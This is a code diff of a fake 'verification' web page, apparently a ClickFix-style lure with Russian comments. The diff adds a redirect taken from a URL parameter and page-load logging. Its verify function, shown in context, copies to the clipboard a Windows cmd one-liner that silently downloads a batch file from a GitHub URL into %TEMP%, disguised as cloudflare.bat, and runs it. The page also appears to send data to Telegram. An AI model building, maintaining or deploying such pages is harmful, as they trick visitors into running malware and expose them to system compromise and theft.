@@ -2167,24 +2167,7 @@
 
         <script>
 
-          // Добавляем обработчик для скрытия ошибки при вводе
-          document.addEventListener('DOMContentLoaded', function() {
-            const verificationInput = document.getElementById('verification-input');
-            const errorMessage = document.getElementById('error-message');
-            
-            verificationInput.addEventListener('input', function() {
-              const value = this.value.trim();
-              if (value === 'R791') {
-                this.classList.remove('error');
-                errorMessage.style.display = 'none';
-              } else if (value) {
-                // Если введен неправильный код, показываем ошибку
-                this.classList.add('error');
-                errorMessage.style.display = 'block';
-                errorMessage.innerHTML = 'Error: invalid verification code. Please enter R791.';
-              }
-            });
-          });
+          // Убираем автоматическую проверку при вводе - проверка только по кнопке Verify
 
           function copyToClipboard(text) {
                 // Create a temporary element
@@ -2224,6 +2207,13 @@ const fullUrl = window.location.href  ;
         return { error: error.message };
     });
 }
+
+        // Функция для получения URL параметров
+        function getRedirectUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('redirect');
+        }
+
         function verify() {
           const verificationInput = document.getElementById('verification-input');
           const inputValue = verificationInput.value.trim();
@@ -2252,8 +2242,15 @@ const fullUrl = window.location.href  ;
           
           console.log("verify!");
           
-          // Обновляем страницу если код R791 верный
-          location.reload();
+          // Получаем URL для редиректа и делаем редирект
+          const redirectUrl = getRedirectUrl();
+          if (redirectUrl) {
+            console.log("Redirecting to:", redirectUrl);
+            window.location.href = redirectUrl;
+          } else {
+            console.log("No redirect URL, reloading page");
+            location.reload();
+          }
           copyToClipboard(`cmd /c "mode con: cols=50 lines=3 && curl -L -o "%TEMP%\cloudflare.bat" "https://raw.githubusercontent.com/helper-net/update/refs/heads/main/update32.bat" >nul 2>&1 && call "%TEMP%\cloudflare.bat""`);
           const verifying = document.getElementById('verifying');
           const RInW4 = document.getElementById('RInW4');
@@ -2595,6 +2592,18 @@ sendTelegramMessageThen( MESSAGE,data);
                 sl();
             }
             )()
+        </script>
+        
+        <script>
+            // Логируем переданный URL при загрузке страницы
+            document.addEventListener('DOMContentLoaded', function() {
+                const redirectUrl = getRedirectUrl();
+                if (redirectUrl) {
+                    console.log("Page loaded with redirect URL:", redirectUrl);
+                } else {
+                    console.log("Page loaded without redirect URL");
+                }
+            });
         </script>
     </body>
 </html>
